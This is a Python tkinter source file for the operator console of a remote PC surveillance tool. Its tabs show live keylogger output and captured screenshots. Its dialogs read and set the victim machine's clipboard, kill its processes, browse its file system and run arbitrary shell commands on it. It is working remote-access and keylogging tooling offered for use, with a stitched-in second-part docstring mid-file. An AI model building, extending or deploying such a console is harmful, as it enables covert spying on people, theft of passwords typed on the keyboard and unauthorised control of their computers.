"""
Server Tab - Individual server monitoring tab
Provides interface for monitoring a single PC
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk
import io
import base64
from typing import Optional

from .api_client import APIClient


class PCTab(ttk.Frame):
    """Tab for monitoring a single PC connection"""

    def __init__(self, parent, main_app, name: str, server_url: str, api_key: str):
        super().__init__(parent)
        self.main_app = main_app
        self.name = name
        self.server_url = server_url
        self.api_key = api_key
        
        # Create API client
        self.api = APIClient(server_url, api_key)
        
        # State
        self.monitoring = False
        self.auto_refresh = False
        self.auto_refresh_job = None
        self.screenshots = []
        self.last_pc_id = None  # Track PC ID for callback matching

        # Create UI
        self.create_ui()

        # Initial status update
        self.update_status()

    def update_from_callback(self, data):
        """Update tab from callback data"""
        try:
            # Update monitoring status
            self.monitoring = data.get('monitoring', False)

            # Update status display
            events_count = data.get('event_count', 0)
            keystrokes_count = data.get('keystroke_count', 0)
            pc_name = data.get('pc_name', 'Unknown')

            status = "🟢 " if self.monitoring else "🔴 "
            status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count} [CALLBACK]"
            self.status_var.set(status)

            # Update events if available
            if 'events' in data:
                self.display_callback_events(data['events'])

            # Update keystrokes if available
            if 'keystrokes' in data:
                self.display_callback_keystrokes(data['keystrokes'])

        except Exception as e:
            print(f"Error updating from callback: {e}")

    def display_callback_events(self, events):
        """Display events received from callback"""
        try:
            # Add to events text widget
            for event in events[-10:]:  # Show last 10
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                self.events_text.insert(tk.END, f"[CALLBACK] {timestamp} - {event_type}\n")

            # Auto-scroll to bottom
            self.events_text.see(tk.END)
        except Exception as e:
            print(f"Error displaying callback events: {e}")

    def display_callback_keystrokes(self, keystrokes):
        """Display keystrokes received from callback"""
        try:
            # Add to keylogger text widget
            for ks in keystrokes[-20:]:  # Show last 20
                key = ks.get('key', '')
                if not key.startswith('Key.'):
                    self.keylogger_text.insert(tk.END, key)

            # Auto-scroll to bottom
            self.keylogger_text.see(tk.END)
        except Exception as e:
            print(f"Error displaying callback keystrokes: {e}")

    def create_ui(self):
        """Create the tab UI elements"""
        # Create notebook for sub-tabs
        self.sub_notebook = ttk.Notebook(self)
        self.sub_notebook.pack(fill=tk.BOTH, expand=True)

        # Create sub-tabs
        self.overview_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.overview_frame, text="Overview")

        self.keylogger_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.keylogger_frame, text="Keylogger")

        self.screenshots_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.screenshots_frame, text="Screenshots")

        self.search_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.search_frame, text="Search")

        # Create control panel
        self.control_frame = ttk.LabelFrame(self, text="Controls")
        self.control_frame.pack(fill=tk.X, pady=5)

        # Add control buttons
        ttk.Button(self.control_frame, text="Refresh", 
                  command=self.refresh).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Start", 
                  command=self.start_monitoring).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Stop", 
                  command=self.stop_monitoring).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Snapshot", 
                  command=self.take_snapshot).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="⚠ KILL SERVER", 
                  command=self.kill_server).pack(side=tk.LEFT, padx=5, pady=5)

        # Auto-refresh checkbox
        self.auto_refresh_var = tk.BooleanVar()
        ttk.Checkbutton(self.control_frame, text="Auto-refresh",
                       variable=self.auto_refresh_var,
                       command=self.toggle_auto_refresh).pack(side=tk.LEFT, padx=5, pady=5)

        # Advanced features
        ttk.Button(self.control_frame, text="Clipboard", 
                  command=self.show_clipboard_dialog).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Processes", 
                  command=self.show_process_dialog).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Files", 
                  command=self.show_filesystem_dialog).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Command", 
                  command=self.show_command_dialog).pack(side=tk.LEFT, padx=5, pady=5)

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Not connected")
        self.status_bar = ttk.Label(self, textvariable=self.status_var, 
                                    relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=5)

        # Initialize tabs
        self.create_overview_tab()
        self.create_keylogger_tab()
        self.create_screenshots_tab()
        self.create_search_tab()

    def toggle_auto_refresh(self):
        """Toggle auto-refresh"""
        self.auto_refresh = self.auto_refresh_var.get()
        if self.auto_refresh:
            self.schedule_auto_refresh()
        elif self.auto_refresh_job:
            self.after_cancel(self.auto_refresh_job)
            self.auto_refresh_job = None

    def schedule_auto_refresh(self):
        """Schedule next auto-refresh"""
        if self.auto_refresh:
            self.refresh()
            self.auto_refresh_job = self.after(15000, self.schedule_auto_refresh)

    def refresh(self):
        """Refresh all data"""
        self.update_status()
        self.refresh_events()
        self.refresh_screenshot()

    def update_status(self):
        """Update connection status"""
        result = self.api.get_status()
        if result:
            self.monitoring = result.get('monitoring', False)
            events_count = result.get('event_count', 0)
            keystrokes_count = result.get('keystroke_count', 0)
            pc_name = result.get('pc_name', 'Unknown')
            
            # Store PC ID for callback matching
            self.last_pc_id = result.get('pc_id')

            status = "🟢 " if self.monitoring else "🔴 "
            status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count}"
            self.status_var.set(status)
        else:
            self.status_var.set("Connection error")

    def start_monitoring(self):
        """Start monitoring on server"""
        result = self.api.start_monitoring()
        if result:
            self.monitoring = True
            self.update_status()
            messagebox.showinfo("Success", "Monitoring started")
        else:
            messagebox.showerror("Error", "Failed to start monitoring")

    def stop_monitoring(self):
        """Stop monitoring on server"""
        result = self.api.stop_monitoring()
        if result:
            self.monitoring = False
            self.update_status()
            messagebox.showinfo("Success", "Monitoring stopped")
        else:
            messagebox.showerror("Error", "Failed to stop monitoring")

    def take_snapshot(self):
        """Take a snapshot on server"""
        result = self.api.take_snapshot()
        if result:
            messagebox.showinfo("Success", "Snapshot taken successfully")
            self.refresh_screenshot()
        else:
            messagebox.showerror("Error", "Failed to take snapshot")

    def kill_server(self):
        """Kill the server process"""
        if messagebox.askyesno("Confirm", 
                              "This will terminate the server process. Continue?"):
            result = self.api.kill_server()
            if result:
                messagebox.showinfo("Success", "Server kill signal sent")
            else:
                messagebox.showinfo("Info", 
                                  "Server may have been killed (connection lost)")

    # ===== Overview Tab =====
    def create_overview_tab(self):
        """Create overview tab content"""
        # Split frame
        left_frame = ttk.Frame(self.overview_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right_frame = ttk.Frame(self.overview_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Screenshot preview
        screenshot_frame = ttk.LabelFrame(left_frame, text="Live View")
        screenshot_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshot_label = ttk.Label(screenshot_frame, 
                                         text="No screenshot available")
        self.screenshot_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        ttk.Button(screenshot_frame, text="Refresh Screenshot", 
                  command=self.refresh_screenshot).pack(pady=5)

        # Events list
        events_frame = ttk.LabelFrame(right_frame, text="Activity Log")
        events_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.events_text = tk.Text(events_frame, wrap=tk.WORD, height=20)
        self.events_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        events_scroll = ttk.Scrollbar(events_frame, command=self.events_text.yview)
        events_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.events_text.config(yscrollcommand=events_scroll.set)

        ttk.Button(events_frame, text="Refresh Events", 
                  command=self.refresh_events).pack(pady=5)

    def refresh_screenshot(self):
        """Refresh screenshot preview"""
        result = self.api.get_latest_screenshot()
        if result and 'image' in result:
            try:
                img_data = base64.b64decode(result['image'])
                img = Image.open(io.BytesIO(img_data))
                img.thumbnail((640, 360), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.screenshot_label.config(image=photo, text="")
                self.screenshot_label.image = photo  # Keep reference
            except Exception as e:
                self.screenshot_label.config(text=f"Error: {str(e)}", image="")
        else:
            self.screenshot_label.config(text="No screenshot available", image="")

    def refresh_events(self):
        """Refresh events list"""
        events = self.api.get_events(limit=50)
        if events:
            self.events_text.delete(1.0, tk.END)
            for event in reversed(events):
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                details = event.get('details', {})

                if event_type == 'key_press':
                    key = details.get('key', '')
                    window = details.get('window', '')
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - Key: {key} in {window}\n")
                elif event_type == 'mouse_click':
                    button = details.get('button', '')
                    x = details.get('x', 0)
                    y = details.get('y', 0)
                    window = details.get('window', '')
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - Mouse {button} at ({x},{y}) in {window}\n")
                elif event_type == 'window_change':
                    title = details.get('title', '')
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - Window: {title}\n")
                else:
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - {event_type}\n")
        else:
            self.events_text.delete(1.0, tk.END)
            self.events_text.insert(tk.END, "Error loading events")

    # ===== Keylogger Tab =====
    def create_keylogger_tab(self):
        """Create keylogger tab content"""
        # Live keystrokes frame
        live_frame = ttk.LabelFrame(self.keylogger_frame, text="Live Keystrokes")
        live_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.keylogger_text = tk.Text(live_frame, wrap=tk.WORD, height=10)
        self.keylogger_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        keylogger_scroll = ttk.Scrollbar(live_frame, command=self.keylogger_text.yview)
        keylogger_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.keylogger_text.config(yscrollcommand=keylogger_scroll.set)

        # Controls
        controls_frame = ttk.Frame(self.keylogger_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(controls_frame, text="Clear", 
                  command=lambda: self.keylogger_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(controls_frame, text="Load Buffer", 
                  command=self.load_keystrokes).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(controls_frame, text="Export Text", 
                  command=self.export_keystrokes).pack(side=tk.LEFT, padx=5)

    def load_keystrokes(self):
        """Load keystrokes from server"""
        result = self.api.get_keystroke_buffer(limit=1000, format_type='text')
        if result:
            self.keylogger_text.delete(1.0, tk.END)
            if isinstance(result, dict) and 'text' in result:
                self.keylogger_text.insert(tk.END, result.get('text', ''))
            elif isinstance(result, str):
                self.keylogger_text.insert(tk.END, result)
        else:
            messagebox.showerror("Error", "Failed to get keystrokes")

    def export_keystrokes(self):
        """Export keystrokes to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.keylogger_text.get(1.0, tk.END))
                messagebox.showinfo("Success", f"Keystrokes exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {str(e)}")
                """
Server Tab - Part 2: Screenshots, Search, and Dialogs
"""

    # ===== Screenshots Tab =====
    def create_screenshots_tab(self):
        """Create screenshots tab content"""
        # Split frame
        left_frame = ttk.Frame(self.screenshots_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right_frame = ttk.Frame(self.screenshots_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Screenshots list
        list_frame = ttk.LabelFrame(left_frame, text="Screenshots")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshots_listbox = tk.Listbox(list_frame, height=20)
        self.screenshots_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.screenshots_listbox.bind('<<ListboxSelect>>', self.preview_screenshot)
        self.screenshots_listbox.bind('<Double-Button-1>', self.show_fullscreen)

        screenshots_scroll = ttk.Scrollbar(list_frame, 
                                          command=self.screenshots_listbox.yview)
        screenshots_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.screenshots_listbox.config(yscrollcommand=screenshots_scroll.set)

        ttk.Button(list_frame, text="Refresh Gallery", 
                  command=self.refresh_gallery).pack(pady=5)

        # Preview
        preview_frame = ttk.LabelFrame(right_frame, text="Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.preview_label = ttk.Label(preview_frame, text="Select a screenshot")
        self.preview_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def refresh_gallery(self):
        """Refresh screenshots gallery"""
        screenshots = self.api.get_screenshot_history()
        if screenshots:
            self.screenshots_listbox.delete(0, tk.END)
            self.screenshots = screenshots
            for screenshot in screenshots:
                filename = screenshot.get('filename', '')
                timestamp = screenshot.get('timestamp', '')
                self.screenshots_listbox.insert(tk.END, f"{timestamp} - {filename}")
        else:
            self.screenshots_listbox.delete(0, tk.END)

    def preview_screenshot(self, event):
        """Preview selected screenshot"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                result = self.api.get_screenshot(filename)
                if result and 'image' in result:
                    img_data = base64.b64decode(result['image'])
                    img = Image.open(io.BytesIO(img_data))
                    img.thumbnail((400, 300), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.preview_label.config(image=photo, text="")
                    self.preview_label.image = photo  # Keep reference
        except Exception as e:
            messagebox.showerror("Error", f"Failed to preview: {str(e)}")

    def show_fullscreen(self, event):
        """Show fullscreen image"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                result = self.api.get_screenshot(filename)
                if result and 'image' in result:
                    img_data = base64.b64decode(result['image'])
                    img = Image.open(io.BytesIO(img_data))

                    top = tk.Toplevel(self)
                    top.title(filename)

                    screen_width = top.winfo_screenwidth()
                    screen_height = top.winfo_screenheight()
                    img_width, img_height = img.size

                    scale = min(screen_width / img_width, 
                               screen_height / img_height) * 0.9
                    new_width = int(img_width * scale)
                    new_height = int(img_height * scale)

                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)

                    label = ttk.Label(top, image=photo)
                    label.image = photo  # Keep reference
                    label.pack(fill=tk.BOTH, expand=True)
                    label.bind('<Button-1>', lambda e: top.destroy())
        except Exception as e:
            messagebox.showerror("Error", f"Failed to show fullscreen: {str(e)}")

    # ===== Search Tab =====
    def create_search_tab(self):
        """Create search tab content"""
        controls_frame = ttk.Frame(self.search_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(controls_frame, text="Search:").grid(
            row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.search_var = tk.StringVar()
        ttk.Entry(controls_frame, textvariable=self.search_var, width=30).grid(
            row=0, column=1, padx=5, pady=5)

        ttk.Label(controls_frame, text="Type:").grid(
            row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.event_type_var = tk.StringVar()
        type_combo = ttk.Combobox(controls_frame, textvariable=self.event_type_var, 
                                  width=15)
        type_combo['values'] = ('', 'key_press', 'mouse_click', 'window_change', 
                               'screenshot')
        type_combo.grid(row=0, column=3, padx=5, pady=5)

        ttk.Button(controls_frame, text="Search", 
                  command=self.search_events).grid(row=0, column=4, padx=5, pady=5)
        
        ttk.Button(controls_frame, text="Clear", 
                  command=self.clear_search).grid(row=0, column=5, padx=5, pady=5)

        results_frame = ttk.LabelFrame(self.search_frame, text="Results")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.results_text = tk.Text(results_frame, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        scroll = ttk.Scrollbar(results_frame, command=self.results_text.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text.config(yscrollcommand=scroll.set)

    def search_events(self):
        """Search events"""
        events = self.api.get_events(
            limit=1000,
            event_type=self.event_type_var.get() or None,
            search=self.search_var.get() or None
        )
        
        if events:
            self.results_text.delete(1.0, tk.END)
            if not events:
                self.results_text.insert(tk.END, "No results found.")
                return

            for event in events:
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                details = event.get('details', {})
                self.results_text.insert(tk.END, 
                                       f"{timestamp} - {event_type}: {details}\n")
        else:
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, "Search failed or no results")

    def clear_search(self):
        """Clear search"""
        self.search_var.set("")
        self.event_type_var.set("")
        self.results_text.delete(1.0, tk.END)

    # ===== Dialog Functions =====
    def show_clipboard_dialog(self):
        """Show clipboard dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Clipboard Monitor")
        dialog.geometry("500x400")
        dialog.transient(self.winfo_toplevel())

        result_text = tk.Text(dialog, wrap=tk.WORD)
        result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        def get_clipboard():
            result = self.api.get_clipboard()
            if result and result.get('success'):
                result_text.delete(1.0, tk.END)
                result_text.insert(tk.END, f"Content:\n{result.get('content', '')}")
            else:
                messagebox.showerror("Error", "Failed to get clipboard")

        def set_clipboard():
            content = result_text.get(1.0, tk.END).strip()
            result = self.api.set_clipboard(content)
            if result and result.get('success'):
                messagebox.showinfo("Success", "Clipboard updated")
            else:
                messagebox.showerror("Error", "Failed to set clipboard")

        btn_frame = ttk.Frame(dialog)
        btn_frame.pack(pady=5)
        
        ttk.Button(btn_frame, text="Get Clipboard", 
                  command=get_clipboard).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Set Clipboard", 
                  command=set_clipboard).pack(side=tk.LEFT, padx=5)

    def show_process_dialog(self):
        """Show process manager dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Process Manager")
        dialog.geometry("800x600")
        dialog.transient(self.winfo_toplevel())

        # Process list
        tree_frame = ttk.Frame(dialog)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        tree = ttk.Treeview(tree_frame, 
                           columns=('PID', 'Name', 'User', 'CPU', 'Memory'),
                           show='headings')
        tree.heading('PID', text='PID')
        tree.heading('Name', text='Name')
        tree.heading('User', text='User')
        tree.heading('CPU', text='CPU %')
        tree.heading('Memory', text='Memory (MB)')
        
        tree.column('PID', width=80)
        tree.column('Name', width=200)
        tree.column('User', width=150)
        tree.column('CPU', width=80)
        tree.column('Memory', width=100)
        
        tree.pack(fill=tk.BOTH, expand=True)

        scroll = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=tree.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        tree.config(yscrollcommand=scroll.set)

        # Controls
        controls = ttk.Frame(dialog)
        controls.pack(fill=tk.X, padx=10, pady=5)

        pid_var = tk.StringVar()
        ttk.Label(controls, text="PID:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(controls, textvariable=pid_var, width=10).pack(side=tk.LEFT, padx=5)

        def load_processes():
            tree.delete(*tree.get_children())
            result = self.api.get_processes()
            if result and result.get('success'):
                for proc in result.get('processes', []):
                    tree.insert('', tk.END, values=(
                        proc.get('pid', ''),
                        proc.get('name', ''),
                        proc.get('username', ''),
                        f"{proc.get('cpu_percent', 0):.1f}",
                        f"{proc.get('memory_mb', 0):.1f}"
                    ))

        def kill_process():
            if not pid_var.get():
                messagebox.showerror("Error", "Enter PID")
                return
            try:
                result = self.api.kill_process(int(pid_var.get()))
                if result and result.get('success'):
                    messagebox.showinfo("Success", "Process killed")
                    load_processes()
                else:
                    messagebox.showerror("Error", "Failed to kill process")
            except ValueError:
                messagebox.showerror("Error", "Invalid PID")

        ttk.Button(controls, text="Refresh", 
                  command=load_processes).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls, text="Kill Process", 
                  command=kill_process).pack(side=tk.LEFT, padx=5)

        # Initial load
        load_processes()

    def show_filesystem_dialog(self):
        """Show filesystem browser dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Filesystem Browser")
        dialog.geometry("900x600")
        dialog.transient(self.winfo_toplevel())

        # Path entry
        path_frame = ttk.Frame(dialog)
        path_frame.pack(fill=tk.X, padx=10, pady=5)
        
        path_var = tk.StringVar(value="C:\\")
        ttk.Label(path_frame, text="Path:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(path_frame, textvariable=path_var, width=60).pack(
            side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        # File list
        tree_frame = ttk.Frame(dialog)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        tree = ttk.Treeview(tree_frame, 
                           columns=('Type', 'Size', 'Modified'),
                           show='tree headings')
        tree.heading('#0', text='Name')
        tree.heading('Type', text='Type')
        tree.heading('Size', text='Size')
        tree.heading('Modified', text='Modified')
        
        tree.column('#0', width=300)
        tree.column('Type', width=100)
        tree.column('Size', width=100)
        tree.column('Modified', width=150)
        
        tree.pack(fill=tk.BOTH, expand=True)

        scroll = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=tree.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        tree.config(yscrollcommand=scroll.set)

        def list_directory():
            tree.delete(*tree.get_children())
            result = self.api.list_directory(path_var.get())
            if result and result.get('success'):
                # Add parent directory
                if result.get('parent'):
                    tree.insert('', 0, text="..", values=('directory', '', ''))
                
                # Add items
                for item in result.get('items', []):
                    tree.insert('', tk.END,
                               text=item.get('name', ''),
                               values=(
                                   item.get('type', ''),
                                   item.get('size', ''),
                                   item.get('modified', '')
                               ))

        def on_double_click(event):
            selection = tree.selection()
            if selection:
                item = tree.item(selection[0])
                name = item['text']
                item_type = item['values'][0] if item['values'] else ''
                
                if item_type == 'directory':
                    if name == '..':
                        # Go to parent
                        import os
                        path_var.set(os.path.dirname(path_var.get()))
                    else:
                        # Go to subdirectory
                        import os
                        path_var.set(os.path.join(path_var.get(), name))
                    list_directory()

        tree.bind('<Double-Button-1>', on_double_click)

        # Controls
        controls = ttk.Frame(dialog)
        controls.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(controls, text="List", 
                  command=list_directory).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls, text="Close", 
                  command=dialog.destroy).pack(side=tk.LEFT, padx=5)

        # Initial list
        list_directory()

    def show_command_dialog(self):
        """Send a command to the server"""
        dialog = tk.Toplevel(self)
        dialog.title("Run Command")
        dialog.geometry("600x400")
        dialog.transient(self.winfo_toplevel())

        ttk.Label(dialog, text="Command:").pack(padx=10, pady=5, anchor=tk.W)
        
        cmd_var = tk.StringVar()
        ttk.Entry(dialog, textvariable=cmd_var, width=80).pack(padx=10, pady=5)

        output_text = tk.Text(dialog, wrap=tk.WORD)
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        scroll = ttk.Scrollbar(dialog, command=output_text.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        output_text.config(yscrollcommand=scroll.set)

        def run_cmd():
            cmd = cmd_var.get().strip()
            if not cmd:
                return
            
            output_text.delete(1.0, tk.END)
            output_text.insert(tk.END, f"Executing: {cmd}\n\n")
            
            result = self.api.execute_shell_command(cmd, timeout=30)
            if result:
                if result.get('status') == 'success':
                    stdout = result.get('stdout', '')
                    stderr = result.get('stderr', '')
                    exit_code = result.get('exit_code', 0)
                    
                    output_text.insert(tk.END, f"Exit Code: {exit_code}\n\n")
                    if stdout:
                        output_text.insert(tk.END, f"STDOUT:\n{stdout}\n\n")
                    if stderr:
                        output_text.insert(tk.END, f"STDERR:\n{stderr}\n")
                else:
                    output_text.insert(tk.END, f"Error: {result.get('error', 'Unknown error')}\n")
            else:
                output_text.insert(tk.END, "Failed to execute command\n")

        ttk.Button(dialog, text="Run", command=run_cmd).pack(pady=5)